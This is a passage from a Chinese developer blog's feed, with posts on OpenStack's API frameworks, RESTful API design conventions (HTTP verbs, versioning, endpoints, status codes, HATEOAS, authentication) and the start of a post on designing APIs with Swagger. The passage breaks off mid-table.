<h3 id="早期项目的api服务"><a href="#早期项目的api服务" class="headerlink" title="早期项目的api服务"></a>早期项目的api服务</h3><p>OpenStack项目倾向于不重新发明轮子，一般都会选择现有的库和框架来使用，除非现有的框架不满足需求。因为Web框架的选择很多，而且都满足需求，所以OpenStack项目到目前为止都是使用现成的Web框架。<br>OpenStack早期的项目并没有使用一个框架，而是使用了几个不同的模块来组合出一个框架：Paste + PasteDeploy + Routes + WebOb，这几个不同的模块分别负责应用的WSGI化、URL路由和请求处理等功能。Nova, Glance, Neutron, Keystone等早期的项目都是使用这样的架构来实现RESTful API的。<br>早期的这种技术选型带来的好处是”框架”具备足够的灵活性，缺点则是要把这几个模块组合起来实现一个REST服务，需要写很多代码，连WSGI的入口函数都要自己实现（比如Keystone项目的keystone/common/wsgi.py文件中的class Application）。因为灵活性的好处不是很明显，而代码量大的坏处很明显，比如上面那个class Application需要在每个项目中复制一遍，所以社区的新项目就开始使用新的Web框架Pecan</p>
<h3 id="新项目的api服务"><a href="#新项目的api服务" class="headerlink" title="新项目的api服务"></a>新项目的api服务</h3><p>Pecan是一个基于对象路由的框架，即灵活又简单。Pecan主要实现了URL路由功能，支持RESTful API。Pecan没有实现模板、session管理和ORM等功能，但是这些功能可以通过其他的模块来实现。对于OpenStack来说，Pecan是一个很好的选择，因为OpenStack项目中统一使用sqlalchemy来实现ORM，API的实现也不需要模板功能，安全控制则基于Keystone体系。使用Pecan来开发REST服务，代码量很少，代码结构也清晰。Ceilometer项目就是使用了Pecan</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://oiw1gzfww.bkt.clouddn.com/openstack.develop.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="开发语言" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/"/>
    
      <category term="Python" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/Python/"/>
    
    
      <category term="openstack" scheme="https://blog.yumaojun.net/tags/openstack/"/>
    
  </entry>
  
  <entry>
    <title>RESTful API 设计规范</title>
    <link href="https://blog.yumaojun.net/2017/01/06/rest-api-design/"/>
    <id>https://blog.yumaojun.net/2017/01/06/rest-api-design/</id>
    <published>2017-01-06T04:32:55.000Z</published>
    <updated>2017-01-06T04:38:40.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://oiw1gzfww.bkt.clouddn.com/rest_api.jpg" alt=""></p>
<a id="more"></a>
<p>做出一个好的API设计很难。API表达的是你的数据和你的数据使用者之间的契约，因此API的设计往往是站在使用者的角度进行的，而关于RESTful的介绍可以参考阮一峰的博客<a href="http://www.ruanyifeng.com/blog/2011/09/restful.html" target="_blank" rel="external">理解RESTful架构
</a>, 这里同时也参考了他的另一篇博客<a href="http://www.ruanyifeng.com/blog/2014/05/restful_api.html" target="_blank" rel="external">RESTful API 设计指南</a>在这方面有一篇很出名的文章，这里需要你自己解决翻墙问题<a href="https://codeplanet.io/principles-good-restful-api-design/" target="_blank" rel="external">Principles of good RESTful API Design</a></p>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>   这里有一些非常重要的术语，我将在本文里面一直用到它们</p>
<ul>
<li>资源(Resource)：一个对象的单独实例，如一只动物</li>
<li>集合(Collection)：一群同种对象，如动物</li>
<li>HTTP：跨网络的通信协议</li>
<li>客户端(Consumer)：可以创建HTTP请求的客户端应用程序</li>
<li>第三方开发者(Third Party Developer)：这个开发者不属于你的项目但是有想使用你的数据</li>
<li>服务器(Server)：一个HTTP服务器或者应用程序，客户端可以跨网络访问它</li>
<li>端点(Endpoint)：这个API在服务器上的URL用于表达一个资源或者一个集合</li>
<li>幂等(Idempotent)：无边际效应，多次操作得到相同的结果</li>
<li>URL段(Segment)：在URL里面已斜杠分隔的内容</li>
</ul>
<h2 id="数据设计与抽象"><a href="#数据设计与抽象" class="headerlink" title="数据设计与抽象"></a>数据设计与抽象</h2><ul>
<li><p>理清业务数据流程</p>
<p>  规划好你的API的外观要先于开发它实际的功能。首先你要知道数据该如何设计和核心服务/应用程序会如何工作, 这部分的工作<br>  往往就是需要写好 PRD和DRD这些功能文档</p>
</li>
<li><p>站在使用者的角度进行合理抽象</p>
<p>  有时候一个集合可以表达一个数据库表，而一个资源可以表达成里面的一行记录，但是这并不是常态。事实上，你的API应该尽可能<br>  通过抽象来分离数据与业务逻辑。这点非常重要，只有这样做你才不会打击到那些拥有复杂业务的第三方开发者，<br>  否则他们是不会使用你的API的。</p>
</li>
<li><p>如何开放API</p>
<p>  当然你的服务可能很多部分是不应该通过API暴露出去的。比较常见的例子就是很多API是不允许第三方来创建用户的。</p>
</li>
</ul>
<h2 id="HTTP-动词"><a href="#HTTP-动词" class="headerlink" title="HTTP 动词"></a>HTTP 动词</h2><p>一个好的RESTful API只允许第三方调用者使用这四个半HTTP动词进行数据交互，并且在URL段里面不出现任何其他的动词。<br>一般来说，GET请求可以被浏览器缓存（通常也是这样的）。例如，缓存请求头用于第二次用户的POST请求。<br>HEAD请求是基于一个无响应体的GET请求，并且也可以被缓存的。</p>
<ul>
<li>GET (选择)：从服务器上获取一个具体的资源或者一个资源列表。</li>
<li>POST （创建）： 在服务器上创建一个新的资源。</li>
<li>PUT （更新）：以整体的方式更新服务器上的一个资源。</li>
<li>PATCH （更新）：只更新服务器上一个资源的一个属性。</li>
<li>DELETE （删除）：删除服务器上的一个资源。</li>
<li>HEAD ： 获取一个资源的元数据，如数据的哈希值或最后的更新时间。</li>
<li>OPTIONS：获取客户端能对资源做什么操作的信息。</li>
</ul>
<h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p>  域名是用于访问你的API服务的第一步，因此如何在域名上表现自己提供的API 服务喃，以下有2种方法</p>
<ul>
<li><p>应该尽量将API部署在专用域名之下。</p>
</li>
<li><p>如果确定API很简单，不会有进一步扩展，可以考虑放在主域名下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://api.example.com   # 专业域名</div><div class="line">https://example.org/api/  # URI中明确说明</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="版本化"><a href="#版本化" class="headerlink" title="版本化"></a>版本化</h2><p>  API是服务器与客户端之间的一个公共契约。如果你对服务器上的API做了一个更改，并且这些更改无法向后兼容，<br>  那么你就打破了这个契约，客户端又会要求你重新支持它。为了避免这样的事情，你既要确保应用程序逐步的演变，<br>  又要让客户端满意。那么你必须在引入新版本API的同时保持旧版本API仍然可用。</p>
<p>  随着时间的推移，你可能声明不再支持某些旧版本的API。申明不支持一个特性并不意味着关闭或者破坏它。<br>  而是告诉客户端旧版本的API将在某个特定的时间被删除，并且建议他们使用新版本的API。</p>
<p>  如果你只是简单的增加一个新的特性到API上，如资源上的一个新属性或者增加一个新的端点，你不需要增加API的版本。<br>  因为这些并不会造成向后兼容性的问题，你只需要修改文档即可。</p>
<p>  这里实现方式有2种：</p>
<ul>
<li><p>应该将API的版本号放入URL</p>
</li>
<li><p>将版本号放在HTTP头信息中，但不如放入URL方便和直观, Github采用的就是这种做法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">https://api.example.com/v1/                       # 在URL中说明</div><div class="line"></div><div class="line">curl -i https://api.github.com/users/octocat/orgs # HTTP头中表示API版本</div><div class="line"></div><div class="line">  HTTP/1.1 200 OK</div><div class="line">  Server: nginx</div><div class="line">  Date: Fri, 12 Oct 2012 23:33:14 GMT</div><div class="line">  Content-Type: application/json; charset=utf-8</div><div class="line">  Connection: keep-alive</div><div class="line">  Status: 200 OK</div><div class="line">  ETag: &quot;a00049ba79152d03380c34652f2cb612&quot;</div><div class="line">  X-GitHub-Media-Type: github.v3</div><div class="line">  </div><div class="line">  X-RateLimit-Limit: 5000</div><div class="line">  X-RateLimit-Remaining: 4987</div><div class="line">  X-RateLimit-Reset: 1350085394</div><div class="line">  </div><div class="line">  Content-Length: 5</div><div class="line">  Cache-Control: max-age=0, private, must-revalidate</div><div class="line">  X-Content-Type-Options: nosniff</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="API-ROOT-URI"><a href="#API-ROOT-URI" class="headerlink" title="API ROOT URI"></a>API ROOT URI</h2><p>  API的根地址很重要。可以通过这个列表快速了解你提供的服务，因此，让你的API根入口点保持尽可能的简单。以github的列</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">maojun@maojun-mbp# curl https://api.github.com</div><div class="line">&#123;</div><div class="line">  &quot;current_user_url&quot;: &quot;https://api.github.com/user&quot;,</div><div class="line">  &quot;current_user_authorizations_html_url&quot;: &quot;https://github.com/settings/connections/applications&#123;/client_id&#125;&quot;,</div><div class="line">  &quot;authorizations_url&quot;: &quot;https://api.github.com/authorizations&quot;,</div><div class="line">  &quot;code_search_url&quot;: &quot;https://api.github.com/search/code?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;,</div><div class="line">  &quot;emails_url&quot;: &quot;https://api.github.com/user/emails&quot;,</div><div class="line">  &quot;emojis_url&quot;: &quot;https://api.github.com/emojis&quot;,</div><div class="line">  &quot;events_url&quot;: &quot;https://api.github.com/events&quot;,</div><div class="line">  &quot;feeds_url&quot;: &quot;https://api.github.com/feeds&quot;,</div><div class="line">  &quot;followers_url&quot;: &quot;https://api.github.com/user/followers&quot;,</div><div class="line">  &quot;following_url&quot;: &quot;https://api.github.com/user/following&#123;/target&#125;&quot;,</div><div class="line">  &quot;gists_url&quot;: &quot;https://api.github.com/gists&#123;/gist_id&#125;&quot;,</div><div class="line">  &quot;hub_url&quot;: &quot;https://api.github.com/hub&quot;,</div><div class="line">  &quot;issue_search_url&quot;: &quot;https://api.github.com/search/issues?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;,</div><div class="line">  &quot;issues_url&quot;: &quot;https://api.github.com/issues&quot;,</div><div class="line">  &quot;keys_url&quot;: &quot;https://api.github.com/user/keys&quot;,</div><div class="line">  &quot;notifications_url&quot;: &quot;https://api.github.com/notifications&quot;,</div><div class="line">  &quot;organization_repositories_url&quot;: &quot;https://api.github.com/orgs/&#123;org&#125;/repos&#123;?type,page,per_page,sort&#125;&quot;,</div><div class="line">  &quot;organization_url&quot;: &quot;https://api.github.com/orgs/&#123;org&#125;&quot;,</div><div class="line">  &quot;public_gists_url&quot;: &quot;https://api.github.com/gists/public&quot;,</div><div class="line">  &quot;rate_limit_url&quot;: &quot;https://api.github.com/rate_limit&quot;,</div><div class="line">  &quot;repository_url&quot;: &quot;https://api.github.com/repos/&#123;owner&#125;/&#123;repo&#125;&quot;,</div><div class="line">  &quot;repository_search_url&quot;: &quot;https://api.github.com/search/repositories?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;,</div><div class="line">  &quot;current_user_repositories_url&quot;: &quot;https://api.github.com/user/repos&#123;?type,page,per_page,sort&#125;&quot;,</div><div class="line">  &quot;starred_url&quot;: &quot;https://api.github.com/user/starred&#123;/owner&#125;&#123;/repo&#125;&quot;,</div><div class="line">  &quot;starred_gists_url&quot;: &quot;https://api.github.com/gists/starred&quot;,</div><div class="line">  &quot;team_url&quot;: &quot;https://api.github.com/teams&quot;,</div><div class="line">  &quot;user_url&quot;: &quot;https://api.github.com/users/&#123;user&#125;&quot;,</div><div class="line">  &quot;user_organizations_url&quot;: &quot;https://api.github.com/user/orgs&quot;,</div><div class="line">  &quot;user_repositories_url&quot;: &quot;https://api.github.com/users/&#123;user&#125;/repos&#123;?type,page,per_page,sort&#125;&quot;,</div><div class="line">  &quot;user_search_url&quot;: &quot;https://api.github.com/search/users?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="Endpoints"><a href="#Endpoints" class="headerlink" title="Endpoints"></a>Endpoints</h2><p>  一个端点就是指向特定资源或资源集合的URL。针对每一个端点来说，你可能想列出所有可行的HTTP动词和端点的组合。<br>  在RESTful架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词，<br>  而且所用的名词往往与数据库的表格名对应。一般来说，数据库中的表都是同种记录的<br>  “集合”（collection），所以API中的名词也应该使用复数。</p>
<p>  请注意如何展示数据之间的关系，特别是雇员与动物园之间的多对多关系。通过添加一个额外的URL段就可以实现更多的交互能力。<br>  当然没有一个HTTP动词能表示正在解雇一个人，但是你可以使用DELETE一个动物园里的雇员来达到相同的效果。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">https://api.example.com/v1/zoos</div><div class="line">https://api.example.com/v1/animals</div><div class="line">https://api.example.com/v1/animal_types</div><div class="line">https://api.example.com/v1/employees</div><div class="line"></div><div class="line">GET /zoos: List all Zoos (ID and Name, not too much detail)</div><div class="line">POST /zoos: Create a new Zoo</div><div class="line">GET /zoos/ZID: Retrieve an entire Zoo object</div><div class="line">PUT /zoos/ZID: Update a Zoo (entire object)</div><div class="line">PATCH /zoos/ZID: Update a Zoo (partial object)</div><div class="line">DELETE /zoos/ZID: Delete a Zoo</div><div class="line">GET /zoos/ZID/animals: Retrieve a listing of Animals (ID and Name).</div><div class="line">GET /animals: List all Animals (ID and Name).</div><div class="line">POST /animals: Create a new Animal</div><div class="line">GET /animals/AID: Retrieve an Animal object</div><div class="line">PUT /animals/AID: Update an Animal (entire object)</div><div class="line">PATCH /animals/AID: Update an Animal (partial object)</div></pre></td></tr></table></figure>
<h2 id="过滤和排序"><a href="#过滤和排序" class="headerlink" title="过滤和排序"></a>过滤和排序</h2><p>  使用过滤和排序有多种原因，因此API应该提供参数，过滤和排序返回结果，降低客户端的复杂度。</p>
<ul>
<li><p>如果记录数量很多，服务器不可能都将它们返回给用户。</p>
</li>
<li><p>从客户端的角度来说，最小化网络传输，并让客户端尽可能快的得到查询结果。</p>
</li>
<li><p>从服务器角度来说，响应请求越小负载就越小。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">?limit=10: 减少返回给客户端的结果数量（用于分页）</div><div class="line">?offset=10: 发送一堆信息给客户端（用于分页）</div><div class="line">?animal_type_id=1: 使用条件匹配来过滤记录</div><div class="line">?sortby=name&amp;order=asc:  对结果按特定属性进行排序</div></pre></td></tr></table></figure>
<h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><p>  服务器向用户返回的状态码和提示信息，因为它们是HTTP的标准，所以通用性上有保证，<br>  状态码的完整定义请看<a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html" target="_blank" rel="external">HTTP1.1/rfc Status Code define</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">状态码范围说明：</div><div class="line">1xx：保留给底层HTTP功能使用的，并且估计在你的职业生涯里面也用不着手动发送这样一个状态码出来。</div><div class="line">2xx：保留给成功消息使用的，你尽可能的确保服务器总发送这些状态码给用户。</div><div class="line">3xx：保留给重定向用的。大多数的API不会太常使用这类状态码，但是在新的超媒体样式的API中会使用更多一些。</div><div class="line">4xx：保留给客户端错误用的。例如，客户端提供了一些错误的数据或请求了不存在的内容。这些请求应该是幂等的，不会改变任何服务器的状态。</div><div class="line">5xx：保留给服务器端错误用的。这些错误常常是从底层的函数抛出来的，并且开发人员也通常没法处理。发送这类状态码的目的是确保客户端能得到一些响应。收到5xx响应后，客户端没办法知道服务器端的状态，所以这类状态码是要尽可能的避免。</div><div class="line"></div><div class="line">常见的一些状态码：</div><div class="line">200 OK - [GET]：服务器成功返回用户请求的数据，该操作是幂等的（Idempotent）。</div><div class="line">201 CREATED - [POST/PUT/PATCH]：用户新建或修改数据成功。</div><div class="line">202 Accepted - [*]：表示一个请求已经进入后台排队（异步任务）</div><div class="line">204 NO CONTENT - [DELETE]：用户删除数据成功。</div><div class="line">400 INVALID REQUEST - [POST/PUT/PATCH]：用户发出的请求有错误，服务器没有进行新建或修改数据的操作，该操作是幂等的。</div><div class="line">401 Unauthorized - [*]：表示用户没有权限（令牌、用户名、密码错误）。</div><div class="line">403 Forbidden - [*] 表示用户得到授权（与401错误相对），但是访问是被禁止的。</div><div class="line">404 NOT FOUND - [*]：用户发出的请求针对的是不存在的记录，服务器没有进行操作，该操作是幂等的。</div><div class="line">406 Not Acceptable - [GET]：用户请求的格式不可得（比如用户请求JSON格式，但是只有XML格式）。</div><div class="line">410 Gone -[GET]：用户请求的资源被永久删除，且不会再得到的。</div><div class="line">422 Unprocesable entity - [POST/PUT/PATCH] 当创建一个对象时，发生一个验证错误。</div><div class="line">500 INTERNAL SERVER ERROR - [*]：服务器发生错误，用户将无法判断发出的请求是否成功。</div></pre></td></tr></table></figure>
<h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>如果状态码是4xx，就应该向用户返回出错信息。一般来说，返回的信息中将error作为键名，出错信息作为键值即可。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="attr">error</span>: <span class="string">"Invalid API key"</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="返回结果"><a href="#返回结果" class="headerlink" title="返回结果"></a>返回结果</h2><p>  针对不同操作，服务器向用户返回的结果应该符合以下规范。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">GET /collection: 返回一系列资源对象</div><div class="line">GET /collection/resource: 返回单独的资源对象</div><div class="line">POST /collection: 返回新创建的资源对象</div><div class="line">PUT /collection/resource: 返回完整的资源对象</div><div class="line">PATCH /collection/resource: 返回完整的资源对象</div><div class="line">DELETE /collection/resource: 返回一个空文档</div></pre></td></tr></table></figure>
<h2 id="Hypermedia-API"><a href="#Hypermedia-API" class="headerlink" title="Hypermedia API"></a>Hypermedia API</h2><p>  RESTful API最好做到Hypermedia，即返回结果中提供链接，连向其他API方法，使得用户不查文档，也知道下一步应该做什么<br>  Hypermedia API的设计被称为<a href="https://en.wikipedia.org/wiki/HATEOAS" target="_blank" rel="external">HATEOAS</a></p>
<ul>
<li><p>link: 用户读取这个属性就知道下一步该调用什么API了</p>
</li>
<li><p>rel: rel表示这个API与当前网址的关系（collection关系，并给出该collection的网址）</p>
</li>
<li><p>href: API的绝对路径</p>
</li>
<li><p>title: API的标题,用于概述用途</p>
</li>
<li><p>type: API 响应的数据类型</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&#123;&quot;link&quot;: &#123;</div><div class="line">  &quot;rel&quot;:   &quot;collection https://www.example.com/zoos&quot;,</div><div class="line">  &quot;href&quot;:  &quot;https://api.example.com/zoos&quot;,</div><div class="line">  &quot;title&quot;: &quot;List of zoos&quot;,</div><div class="line">  &quot;type&quot;:  &quot;application/vnd.yourformat+json&quot;</div><div class="line">&#125;&#125;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"> maojun@maojun-mbp#curl https://api.github.com/user</div><div class="line">&#123;</div><div class="line">  &quot;message&quot;: &quot;Requires authentication&quot;,</div><div class="line">  &quot;documentation_url&quot;: &quot;https://developer.github.com/v3&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h2><p>  认证和授权的用户模型该尽量采用RBAC模型，因为其良好的扩容性。 API认证的手段最好采用OAuth2.0, 简单的可以采用<br>  JWT（Json Web Token）</p>
<p>  关于OAuth的简介可以参考<a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="external">阮一峰OAuth2.0简介</a><br>  关于JWT参考此文<a href="http://www.haomou.net/2014/08/13/2014_web_token/" target="_blank" rel="external">JWT使用</a></p>
<h2 id="内容类型"><a href="#内容类型" class="headerlink" title="内容类型"></a>内容类型</h2><p>  XML已是过去时了，现代的web统一使用JSON，也就是HTTP头种的Content Type标签采用 application/json</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">请求报文</div><div class="line">POST /v1/animal HTTP/1.1</div><div class="line">Host: api.example.org</div><div class="line">Accept: application/json</div><div class="line">Content-Type: application/json</div><div class="line">Content-Length: 24</div><div class="line"> </div><div class="line">&#123;</div><div class="line">  &quot;name&quot;: &quot;Gir&quot;,</div><div class="line">  &quot;animal_type&quot;: 12</div><div class="line">&#125;</div><div class="line"></div><div class="line">响应报文</div><div class="line">HTTP/1.1 200 OK</div><div class="line">Date: Wed, 18 Dec 2013 06:08:22 GMT</div><div class="line">Content-Type: application/json</div><div class="line">Access-Control-Max-Age: 1728000</div><div class="line">Cache-Control: no-cache</div><div class="line"> </div><div class="line">&#123;</div><div class="line">  &quot;id&quot;: 12,</div><div class="line">  &quot;created&quot;: 1386363036,</div><div class="line">  &quot;modified&quot;: 1386363036,</div><div class="line">  &quot;name&quot;: &quot;Gir&quot;,</div><div class="line">  &quot;animal_type&quot;: 12</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://oiw1gzfww.bkt.clouddn.com/rest_api.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="程序设计" scheme="https://blog.yumaojun.net/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
      <category term="RESTful API" scheme="https://blog.yumaojun.net/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/RESTful-API/"/>
    
    
      <category term="restful" scheme="https://blog.yumaojun.net/tags/restful/"/>
    
  </entry>
  
  <entry>
    <title>如何使用swagger设计出漂亮的RESTful API</title>
    <link href="https://blog.yumaojun.net/2017/01/05/api-design-swagger/"/>
    <id>https://blog.yumaojun.net/2017/01/05/api-design-swagger/</id>
    <published>2017-01-05T05:19:16.000Z</published>
    <updated>2017-01-06T06:02:18.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://oiw1gzfww.bkt.clouddn.com/swagger_example.png" alt=""><br><a id="more"></a></p>
<p>按照现在的趋势，前后端分离几乎已经是业界对开发和部署方式所达成的一种共识, 后台只负责数据的提供和计算，而完全不处理展现。而前端则负责拿到数据，组织数据并展现的工作。这样结构清晰，关注点分离，前后端会变得相对独立并松耦合。而前段和后端对待的契约就是API设计文档, 有了API的设计文档过后, 后端依据设计文件开发后端程序, 前段根据API设计文档模拟服务器,开发前段页面。而<code>Swagger</code>就是其中一种比较优秀的 <code>RESTful API</code>设计工具。</p>
<h2 id="swagger-工具简介"><a href="#swagger-工具简介" class="headerlink" title="swagger 工具简介"></a>swagger 工具简介</h2><p>swagger是一个RESTful API 的设计工具，官方提供3种工具：</p>
<ol>
<li><code>swagger-editor</code> 在线编辑器，同时提供编辑-展现-客户端-服务端代码的生成</li>
<li><code>swagger-ui</code> 展示工具，将编辑器定义好的json描述文件友好展示的工具。</li>
<li><code>swagger-codegen</code> 生成服务端和客户端的代码。</li>
</ol>
<p>因为swagger-editor集成了swagger-codegen功能，因此我们仅需要使用swagger-editor和swagger-ui就够了。</p>
<h2 id="编辑器-editor"><a href="#编辑器-editor" class="headerlink" title="编辑器(editor)"></a>编辑器(editor)</h2><p>可以使用在线编辑器，而由于网络原因, 往往不能很好的使用swagger提供的在线编辑器，然而这个在线编辑器也可以本地部署，其次有很多编辑器也有swagger的插件, 通过按照swagger插件，我们也可以配置出一个swagger的编辑器。有了编辑器后，我们需要熟悉使用swagger来设计API的一些语法。</p>
<h3 id="部署本地编辑器"><a href="#部署本地编辑器" class="headerlink" title="部署本地编辑器"></a>部署本地编辑器</h3><p>安装docker，配置镜像加速，然后拉去镜像到本地运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">docker pull swaggerapi/swagger-editor</div><div class="line">docker run -p 80:8080 swaggerapi/swagger-editor</div></pre></td></tr></table></figure></p>
<h3 id="使用本地编辑器"><a href="#使用本地编辑器" class="headerlink" title="使用本地编辑器"></a>使用本地编辑器</h3><p>推荐使用<code>vscode</code>作为编辑器, 安装vscode的<code>Swagger View</code>插件 就可以打造一个 swagger的编辑器了采用yaml编写，然后使用Swagger Preview 查看预览。</p>
<h3 id="swagger2-0语法"><a href="#swagger2-0语法" class="headerlink" title="swagger2.0语法"></a>swagger2.0语法</h3><p>详情参考<a href="http://swagger.io/specification/" target="_blank" rel="external">swagger2.0官方规范</a></p>
<ul>
<li><p>格式<br>采用json， 因为yaml是json的一个超集，因此也可以使用。通常情况我们通过yaml来完成编辑，最后通过编辑器导出为json文件。</p>
</li>
<li><p>文件结构<br>为一个单独的文件，但是其中definitions部分可以被抽出来为一个独立文件，通过$ref进行引用，按照惯例，这个文件应该被命名为 swagger.json</p>
</li>
<li><p>数据类型<br>用于描述一个数据的数据类型，对象定义时使用。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>Common Name</th>
<th style="text-align:center">type</th>
<th style="text-align:center">format</th>
<th style="text-align:right">Comments</th>
</tr>
</thead>
<tbody>
<tr>
<td>integer</td>
<td style="text-align:center">integer</td>
<td style="text-align:center">int32</td>
<td style="text-align:right">signed 32 bits</td>
</tr>
<tr>
<td>long</td>
<td style="text-align:center">integer</td>
<td style="text-align:center">int64</td>
<td style="text-align:right">signed 64 bits</td>
</tr>
<tr>
<td>float</td>
<td style="text-align:center">number</td>
<td style="text-align:center">float</td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>double</td>
<td style="text-align:center">number</td>
<td style="text-align:center">double</td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>string</td>
<td style="text-align:center">string</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>byte</td>
<td style="text-align:center">string</td>
<td style="text-align:center">byte</td>
<td style="text-align:right">base64 encoded characters</td>
</tr>
<tr>
<td>binary</td>
<td style="text-align:center">string</td>
<td style="text-align:center">binary</td>
<td style="text-align:right">any sequence of octets</td>
</tr>
<tr>
<td>boolean</td>
<td style="text-align:center">boolean</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>date</td>
<td style="text-align:center">string</td>
<td style="text-align:center">date</td>
<td style="text-align:right">As defined by full-date - RFC3339</td>
</tr>
<tr>
<td>dateTime</td>
<td style="text-align:center">string</td>
<td style="text-align:center">date-time</td>
<td style="text-align:right">As defined by date-time - RFC3339</td>
</tr>
<tr>
<td>password</td>
<td style="text-align:center">string</td>
<td style="text-align:center">password</td>
<td style="text-align:right">Used to hint UIs the input needs to be obscured.</td>
</tr>
</tbody>
</table>
<ul>
<li>规范<br>规范也就是语法，会安装此规范来编写API设计文档。以下列出了所有需要的关键字段</li>
</ul>
<table>
<thead>
<tr>
<th>字段名</th>
<th style="text-align:center">类型</th>
<th style="text-align:right">描述    </th>
</tr>
</thead>
<tbody>
<tr>
<td>swagger</td>
<td style="text-align:center">string</td>
